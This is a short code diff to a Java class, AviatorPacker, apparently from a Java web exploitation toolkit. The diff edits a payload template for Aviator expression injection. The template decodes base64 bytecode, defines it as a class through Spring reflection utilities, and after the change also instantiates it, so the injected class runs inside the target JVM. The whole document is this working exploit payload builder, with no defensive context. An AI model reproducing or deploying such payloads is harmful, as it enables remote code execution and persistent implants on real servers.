@@ -8,7 +8,7 @@ import com.reajason.javaweb.packer.Packer;
  * @since 2024/12/13
  */
 public class AviatorPacker implements Packer {
-    String template = "use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('{{className}}', Base64Utils.decodeFromString('{{base64Str}}'), ReflectionUtils.invokeMethod(ClassUtils.getMethod(Class.forName('java.lang.Thread'), 'getContextClassLoader', nil), Thread.currentThread()));";
+    String template = "use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.newInstance(ReflectUtils.defineClass('{{className}}', Base64Utils.decodeFromString('{{base64Str}}'), ReflectionUtils.invokeMethod(ClassUtils.getMethod(Class.forName('java.lang.Thread'), 'getContextClassLoader', nil), Thread.currentThread())));";
 
     @Override
     public String pack(ClassPackerConfig config) {
